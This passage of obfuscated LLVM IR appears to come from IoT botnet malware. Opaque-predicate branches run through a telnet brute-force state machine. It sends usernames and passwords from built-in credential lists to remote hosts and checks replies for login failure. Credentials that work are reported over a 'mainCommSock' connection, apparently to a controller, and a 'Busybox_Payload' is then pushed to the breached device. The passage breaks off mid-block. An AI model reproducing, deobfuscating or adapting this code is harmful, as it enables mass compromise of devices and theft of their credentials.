  %500 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %499
  %501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %500, i32 0, i32 9
  %502 = load i32, i32* %501, align 8
  %503 = add i32 %502, 6
  %504 = zext i32 %503 to i64
  %505 = call i64 @time(i64* null) #5
  %506 = icmp slt i64 %504, %505
  br i1 %506, label %507, label %538

; <label>:507:                                    ; preds = %497
  %508 = load i32, i32* @x.97
  %509 = load i32, i32* @y.98
  %510 = sub i32 %508, 1
  %511 = mul i32 %508, %510
  %512 = urem i32 %511, 2
  %513 = icmp eq i32 %512, 0
  %514 = icmp slt i32 %509, 10
  %515 = or i1 %513, %514
  br i1 %515, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %507
  %516 = load i32, i32* %3, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %517
  %519 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %518, i32 0, i32 0
  %520 = load i32, i32* %519, align 8
  %521 = call i32 @sclose(i32 %520)
  %522 = load i32, i32* %3, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %523
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %524, i32 0, i32 3
  store i8 0, i8* %525, align 4
  %526 = load i32, i32* %3, align 4
  %527 = sext i32 %526 to i64
  %528 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %527
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %528, i32 0, i32 4
  store i8 1, i8* %529, align 1
  %530 = load i32, i32* @x.97
  %531 = load i32, i32* @y.98
  %532 = sub i32 %530, 1
  %533 = mul i32 %530, %532
  %534 = urem i32 %533, 2
  %535 = icmp eq i32 %534, 0
  %536 = icmp slt i32 %531, 10
  %537 = or i1 %535, %536
  br i1 %537, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %538

; <label>:538:                                    ; preds = %originalBBpart242, %497
  %539 = load i32, i32* @x.97
  %540 = load i32, i32* @y.98
  %541 = sub i32 %539, 1
  %542 = mul i32 %539, %541
  %543 = urem i32 %542, 2
  %544 = icmp eq i32 %543, 0
  %545 = icmp slt i32 %540, 10
  %546 = or i1 %544, %545
  br i1 %546, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %538
  %547 = load i32, i32* @x.97
  %548 = load i32, i32* @y.98
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %1155

; <label>:555:                                    ; preds = %122
  %556 = load i32, i32* @x.97
  %557 = load i32, i32* @y.98
  %558 = sub i32 %556, 1
  %559 = mul i32 %556, %558
  %560 = urem i32 %559, 2
  %561 = icmp eq i32 %560, 0
  %562 = icmp slt i32 %557, 10
  %563 = or i1 %561, %562
  br i1 %563, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %555
  %564 = load i32, i32* %3, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 0
  %568 = load i32, i32* %567, align 8
  %569 = load i32, i32* %3, align 4
  %570 = sext i32 %569 to i64
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %570
  %572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %571, i32 0, i32 11
  %573 = load i8*, i8** %572, align 8
  %574 = call i32 @read_until_response(i32 %568, i32 10000, i8* %573, i32 256, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %575 = icmp ne i32 %574, 0
  %576 = load i32, i32* @x.97
  %577 = load i32, i32* @y.98
  %578 = sub i32 %576, 1
  %579 = mul i32 %576, %578
  %580 = urem i32 %579, 2
  %581 = icmp eq i32 %580, 0
  %582 = icmp slt i32 %577, 10
  %583 = or i1 %581, %582
  br i1 %583, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %575, label %584, label %651

; <label>:584:                                    ; preds = %originalBBpart250
  %585 = load i32, i32* %3, align 4
  %586 = sext i32 %585 to i64
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %586
  %588 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %587, i32 0, i32 11
  %589 = load i8*, i8** %588, align 8
  %590 = call i32 @contains_fail(i8* %589)
  %591 = icmp ne i32 %590, 0
  br i1 %591, label %592, label %613

; <label>:592:                                    ; preds = %584
  %593 = load i32, i32* @x.97
  %594 = load i32, i32* @y.98
  %595 = sub i32 %593, 1
  %596 = mul i32 %593, %595
  %597 = urem i32 %596, 2
  %598 = icmp eq i32 %597, 0
  %599 = icmp slt i32 %594, 10
  %600 = or i1 %598, %599
  br i1 %600, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %592
  %601 = load i32, i32* %3, align 4
  %602 = sext i32 %601 to i64
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %602
  %604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %603, i32 0, i32 3
  store i8 0, i8* %604, align 4
  %605 = load i32, i32* @x.97
  %606 = load i32, i32* @y.98
  %607 = sub i32 %605, 1
  %608 = mul i32 %605, %607
  %609 = urem i32 %608, 2
  %610 = icmp eq i32 %609, 0
  %611 = icmp slt i32 %606, 10
  %612 = or i1 %610, %611
  br i1 %612, label %originalBBpart254, label %originalBB52alteredBB

originalBBpart254:                                ; preds = %originalBB52
  br label %634

; <label>:613:                                    ; preds = %584
  %614 = load i32, i32* @x.97
  %615 = load i32, i32* @y.98
  %616 = sub i32 %614, 1
  %617 = mul i32 %614, %616
  %618 = urem i32 %617, 2
  %619 = icmp eq i32 %618, 0
  %620 = icmp slt i32 %615, 10
  %621 = or i1 %619, %620
  br i1 %621, label %originalBB56, label %originalBB56alteredBB

originalBB56:                                     ; preds = %originalBB56alteredBB, %613
  %622 = load i32, i32* %3, align 4
  %623 = sext i32 %622 to i64
  %624 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %623
  %625 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %624, i32 0, i32 3
  store i8 3, i8* %625, align 4
  %626 = load i32, i32* @x.97
  %627 = load i32, i32* @y.98
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart258, label %originalBB56alteredBB

originalBBpart258:                                ; preds = %originalBB56
  br label %634

; <label>:634:                                    ; preds = %originalBBpart258, %originalBBpart254
  %635 = load i32, i32* @x.97
  %636 = load i32, i32* @y.98
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %634
  %643 = load i32, i32* @x.97
  %644 = load i32, i32* @y.98
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart262, label %originalBB60alteredBB

originalBBpart262:                                ; preds = %originalBB60
  br label %1156

; <label>:651:                                    ; preds = %originalBBpart250
  %652 = load i32, i32* %3, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 9
  %656 = load i32, i32* %655, align 8
  %657 = add i32 %656, 6
  %658 = zext i32 %657 to i64
  %659 = call i64 @time(i64* null) #5
  %660 = icmp slt i64 %658, %659
  br i1 %660, label %661, label %670

; <label>:661:                                    ; preds = %651
  %662 = load i32, i32* %3, align 4
  %663 = sext i32 %662 to i64
  %664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %663
  %665 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %664, i32 0, i32 3
  store i8 0, i8* %665, align 4
  %666 = load i32, i32* %3, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 4
  store i8 1, i8* %669, align 1
  br label %670

; <label>:670:                                    ; preds = %661, %651
  br label %1155

; <label>:671:                                    ; preds = %122
  %672 = load i32, i32* %3, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %673
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %674, i32 0, i32 0
  %676 = load i32, i32* %675, align 8
  %677 = load i32, i32* %3, align 4
  %678 = sext i32 %677 to i64
  %679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %678
  %680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %679, i32 0, i32 5
  %681 = load i8, i8* %680, align 2
  %682 = zext i8 %681 to i64
  %683 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %682
  %684 = load i8*, i8** %683, align 8
  %685 = load i32, i32* %3, align 4
  %686 = sext i32 %685 to i64
  %687 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %686
  %688 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %687, i32 0, i32 5
  %689 = load i8, i8* %688, align 2
  %690 = zext i8 %689 to i64
  %691 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %690
  %692 = load i8*, i8** %691, align 8
  %693 = call i64 @strlen(i8* %692) #9
  %694 = call i64 @send(i32 %676, i8* %684, i64 %693, i32 16384)
  %695 = icmp slt i64 %694, 0
  br i1 %695, label %696, label %705

; <label>:696:                                    ; preds = %671
  %697 = load i32, i32* %3, align 4
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %698
  %700 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %699, i32 0, i32 3
  store i8 0, i8* %700, align 4
  %701 = load i32, i32* %3, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 4
  store i8 1, i8* %704, align 1
  br label %1156

; <label>:705:                                    ; preds = %671
  %706 = load i32, i32* %3, align 4
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %707
  %709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %708, i32 0, i32 0
  %710 = load i32, i32* %709, align 8
  %711 = call i64 @send(i32 %710, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %712 = icmp slt i64 %711, 0
  br i1 %712, label %713, label %722

; <label>:713:                                    ; preds = %705
  %714 = load i32, i32* %3, align 4
  %715 = sext i32 %714 to i64
  %716 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %715
  %717 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %716, i32 0, i32 3
  store i8 0, i8* %717, align 4
  %718 = load i32, i32* %3, align 4
  %719 = sext i32 %718 to i64
  %720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %719
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %720, i32 0, i32 4
  store i8 1, i8* %721, align 1
  br label %1156

; <label>:722:                                    ; preds = %705
  %723 = load i32, i32* %3, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 3
  store i8 4, i8* %726, align 4
  br label %1155

; <label>:727:                                    ; preds = %122
  %728 = load i32, i32* %3, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %729
  %731 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %730, i32 0, i32 0
  %732 = load i32, i32* %731, align 8
  %733 = load i32, i32* %3, align 4
  %734 = sext i32 %733 to i64
  %735 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %734
  %736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %735, i32 0, i32 11
  %737 = load i8*, i8** %736, align 8
  %738 = call i32 @read_until_response(i32 %732, i32 10000, i8* %737, i32 256, i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @advances, i32 0, i32 0))
  %739 = icmp ne i32 %738, 0
  br i1 %739, label %740, label %775

; <label>:740:                                    ; preds = %727
  %741 = load i32, i32* %3, align 4
  %742 = sext i32 %741 to i64
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 11
  %745 = load i8*, i8** %744, align 8
  %746 = call i32 @contains_fail(i8* %745)
  %747 = icmp ne i32 %746, 0
  br i1 %747, label %748, label %769

; <label>:748:                                    ; preds = %740
  %749 = load i32, i32* @x.97
  %750 = load i32, i32* @y.98
  %751 = sub i32 %749, 1
  %752 = mul i32 %749, %751
  %753 = urem i32 %752, 2
  %754 = icmp eq i32 %753, 0
  %755 = icmp slt i32 %750, 10
  %756 = or i1 %754, %755
  br i1 %756, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %748
  %757 = load i32, i32* %3, align 4
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %758
  %760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %759, i32 0, i32 3
  store i8 0, i8* %760, align 4
  %761 = load i32, i32* @x.97
  %762 = load i32, i32* @y.98
  %763 = sub i32 %761, 1
  %764 = mul i32 %761, %763
  %765 = urem i32 %764, 2
  %766 = icmp eq i32 %765, 0
  %767 = icmp slt i32 %762, 10
  %768 = or i1 %766, %767
  br i1 %768, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br label %774

; <label>:769:                                    ; preds = %740
  %770 = load i32, i32* %3, align 4
  %771 = sext i32 %770 to i64
  %772 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %771
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %772, i32 0, i32 3
  store i8 5, i8* %773, align 4
  br label %774

; <label>:774:                                    ; preds = %769, %originalBBpart266
  br label %1156

; <label>:775:                                    ; preds = %727
  %776 = load i32, i32* %3, align 4
  %777 = sext i32 %776 to i64
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 9
  %780 = load i32, i32* %779, align 8
  %781 = add i32 %780, 6
  %782 = zext i32 %781 to i64
  %783 = call i64 @time(i64* null) #5
  %784 = icmp slt i64 %782, %783
  br i1 %784, label %785, label %794

; <label>:785:                                    ; preds = %775
  %786 = load i32, i32* %3, align 4
  %787 = sext i32 %786 to i64
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %787
  %789 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %788, i32 0, i32 3
  store i8 0, i8* %789, align 4
  %790 = load i32, i32* %3, align 4
  %791 = sext i32 %790 to i64
  %792 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %791
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %792, i32 0, i32 4
  store i8 1, i8* %793, align 1
  br label %794

; <label>:794:                                    ; preds = %785, %775
  br label %1155

; <label>:795:                                    ; preds = %122
  %796 = load i32, i32* %3, align 4
  %797 = sext i32 %796 to i64
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %797
  %799 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %798, i32 0, i32 0
  %800 = load i32, i32* %799, align 8
  %801 = load i32, i32* %3, align 4
  %802 = sext i32 %801 to i64
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %802
  %804 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %803, i32 0, i32 6
  %805 = load i8, i8* %804, align 1
  %806 = zext i8 %805 to i64
  %807 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %806
  %808 = load i8*, i8** %807, align 8
  %809 = load i32, i32* %3, align 4
  %810 = sext i32 %809 to i64
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 6
  %813 = load i8, i8* %812, align 1
  %814 = zext i8 %813 to i64
  %815 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %814
  %816 = load i8*, i8** %815, align 8
  %817 = call i64 @strlen(i8* %816) #9
  %818 = call i64 @send(i32 %800, i8* %808, i64 %817, i32 16384)
  %819 = icmp slt i64 %818, 0
  br i1 %819, label %820, label %829

; <label>:820:                                    ; preds = %795
  %821 = load i32, i32* %3, align 4
  %822 = sext i32 %821 to i64
  %823 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %822
  %824 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %823, i32 0, i32 3
  store i8 0, i8* %824, align 4
  %825 = load i32, i32* %3, align 4
  %826 = sext i32 %825 to i64
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %826
  %828 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %827, i32 0, i32 4
  store i8 1, i8* %828, align 1
  br label %1156

; <label>:829:                                    ; preds = %795
  %830 = load i32, i32* @x.97
  %831 = load i32, i32* @y.98
  %832 = sub i32 %830, 1
  %833 = mul i32 %830, %832
  %834 = urem i32 %833, 2
  %835 = icmp eq i32 %834, 0
  %836 = icmp slt i32 %831, 10
  %837 = or i1 %835, %836
  br i1 %837, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %829
  %838 = load i32, i32* %3, align 4
  %839 = sext i32 %838 to i64
  %840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %839
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %840, i32 0, i32 0
  %842 = load i32, i32* %841, align 8
  %843 = call i64 @send(i32 %842, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.866, i32 0, i32 0), i64 2, i32 16384)
  %844 = icmp slt i64 %843, 0
  %845 = load i32, i32* @x.97
  %846 = load i32, i32* @y.98
  %847 = sub i32 %845, 1
  %848 = mul i32 %845, %847
  %849 = urem i32 %848, 2
  %850 = icmp eq i32 %849, 0
  %851 = icmp slt i32 %846, 10
  %852 = or i1 %850, %851
  br i1 %852, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br i1 %844, label %853, label %878

; <label>:853:                                    ; preds = %originalBBpart270
  %854 = load i32, i32* @x.97
  %855 = load i32, i32* @y.98
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %853
  %862 = load i32, i32* %3, align 4
  %863 = sext i32 %862 to i64
  %864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %863
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %864, i32 0, i32 3
  store i8 0, i8* %865, align 4
  %866 = load i32, i32* %3, align 4
  %867 = sext i32 %866 to i64
  %868 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %867
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %868, i32 0, i32 4
  store i8 1, i8* %869, align 1
  %870 = load i32, i32* @x.97
  %871 = load i32, i32* @y.98
  %872 = sub i32 %870, 1
  %873 = mul i32 %870, %872
  %874 = urem i32 %873, 2
  %875 = icmp eq i32 %874, 0
  %876 = icmp slt i32 %871, 10
  %877 = or i1 %875, %876
  br i1 %877, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br label %1156

; <label>:878:                                    ; preds = %originalBBpart270
  %879 = load i32, i32* @x.97
  %880 = load i32, i32* @y.98
  %881 = sub i32 %879, 1
  %882 = mul i32 %879, %881
  %883 = urem i32 %882, 2
  %884 = icmp eq i32 %883, 0
  %885 = icmp slt i32 %880, 10
  %886 = or i1 %884, %885
  br i1 %886, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %878
  %887 = load i32, i32* %3, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 3
  store i8 6, i8* %890, align 4
  %891 = load i32, i32* @x.97
  %892 = load i32, i32* @y.98
  %893 = sub i32 %891, 1
  %894 = mul i32 %891, %893
  %895 = urem i32 %894, 2
  %896 = icmp eq i32 %895, 0
  %897 = icmp slt i32 %892, 10
  %898 = or i1 %896, %897
  br i1 %898, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %1155

; <label>:899:                                    ; preds = %122
  %900 = load i32, i32* %3, align 4
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %901
  %903 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %902, i32 0, i32 0
  %904 = load i32, i32* %903, align 8
  %905 = load i32, i32* %3, align 4
  %906 = sext i32 %905 to i64
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 11
  %909 = load i8*, i8** %908, align 8
  %910 = call i32 @read_until_response(i32 %904, i32 10000, i8* %909, i32 256, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %911 = icmp ne i32 %910, 0
  br i1 %911, label %912, label %981

; <label>:912:                                    ; preds = %899
  %913 = call i64 @time(i64* null) #5
  %914 = trunc i64 %913 to i32
  %915 = load i32, i32* %3, align 4
  %916 = sext i32 %915 to i64
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 9
  store i32 %914, i32* %918, align 8
  %919 = load i32, i32* %3, align 4
  %920 = sext i32 %919 to i64
  %921 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %920
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %921, i32 0, i32 11
  %923 = load i8*, i8** %922, align 8
  %924 = call i32 @contains_fail(i8* %923)
  %925 = icmp ne i32 %924, 0
  br i1 %925, label %926, label %931

; <label>:926:                                    ; preds = %912
  %927 = load i32, i32* %3, align 4
  %928 = sext i32 %927 to i64
  %929 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %928
  %930 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %929, i32 0, i32 3
  store i8 0, i8* %930, align 4
  br label %980

; <label>:931:                                    ; preds = %912
  %932 = load i32, i32* @mainCommSock, align 4
  %933 = load i32, i32* %3, align 4
  %934 = sext i32 %933 to i64
  %935 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %934
  %936 = call i8* @get_telstate_host(%struct.telstate_t* %935)
  %937 = load i32, i32* %3, align 4
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %938
  %940 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %939, i32 0, i32 5
  %941 = load i8, i8* %940, align 2
  %942 = zext i8 %941 to i64
  %943 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %942
  %944 = load i8*, i8** %943, align 8
  %945 = load i32, i32* %3, align 4
  %946 = sext i32 %945 to i64
  %947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %946
  %948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %947, i32 0, i32 6
  %949 = load i8, i8* %948, align 1
  %950 = zext i8 %949 to i64
  %951 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %950
  %952 = load i8*, i8** %951, align 8
  %953 = call i32 (i32, i8*, ...) @sockprintf(i32 %932, i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str.877, i32 0, i32 0), i8* %936, i8* %944, i8* %952)
  %954 = load i32, i32* @mainCommSock, align 4
  %955 = load i32, i32* %3, align 4
  %956 = sext i32 %955 to i64
  %957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %956
  %958 = call i8* @get_telstate_host(%struct.telstate_t* %957)
  %959 = load i32, i32* %3, align 4
  %960 = sext i32 %959 to i64
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %960
  %962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %961, i32 0, i32 5
  %963 = load i8, i8* %962, align 2
  %964 = zext i8 %963 to i64
  %965 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Usernames, i64 0, i64 %964
  %966 = load i8*, i8** %965, align 8
  %967 = load i32, i32* %3, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %968
  %970 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %969, i32 0, i32 6
  %971 = load i8, i8* %970, align 1
  %972 = zext i8 %971 to i64
  %973 = getelementptr inbounds [7 x i8*], [7 x i8*]* @Telnet_Passwords, i64 0, i64 %972
  %974 = load i8*, i8** %973, align 8
  %975 = call i32 (i32, i8*, ...) @sockprintf(i32 %954, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.865, i32 0, i32 0), i8* %958, i8* %966, i8* %974)
  %976 = load i32, i32* %3, align 4
  %977 = sext i32 %976 to i64
  %978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %977
  %979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %978, i32 0, i32 3
  store i8 7, i8* %979, align 4
  br label %980

; <label>:980:                                    ; preds = %931, %926
  br label %1156

; <label>:981:                                    ; preds = %899
  %982 = load i32, i32* %3, align 4
  %983 = sext i32 %982 to i64
  %984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %983
  %985 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %984, i32 0, i32 9
  %986 = load i32, i32* %985, align 8
  %987 = add i32 %986, 6
  %988 = zext i32 %987 to i64
  %989 = call i64 @time(i64* null) #5
  %990 = icmp slt i64 %988, %989
  br i1 %990, label %991, label %1000

; <label>:991:                                    ; preds = %981
  %992 = load i32, i32* %3, align 4
  %993 = sext i32 %992 to i64
  %994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %993
  %995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %994, i32 0, i32 3
  store i8 0, i8* %995, align 4
  %996 = load i32, i32* %3, align 4
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %997
  %999 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %998, i32 0, i32 4
  store i8 1, i8* %999, align 1
  br label %1000

; <label>:1000:                                   ; preds = %991, %981
  br label %1155

; <label>:1001:                                   ; preds = %122
  %1002 = load i32, i32* %3, align 4
  %1003 = sext i32 %1002 to i64
  %1004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1003
  %1005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1004, i32 0, i32 0
  %1006 = load i32, i32* %1005, align 8
  %1007 = load i8*, i8** @Busybox_Payload, align 8
  %1008 = load i8*, i8** @Busybox_Payload, align 8
  %1009 = call i64 @strlen(i8* %1008) #9
  %1010 = call i64 @send(i32 %1006, i8* %1007, i64 %1009, i32 16384)
  %1011 = icmp slt i64 %1010, 0
  br i1 %1011, label %1012, label %1021

; <label>:1012:                                   ; preds = %1001
  %1013 = load i32, i32* %3, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %27, i64 %1014
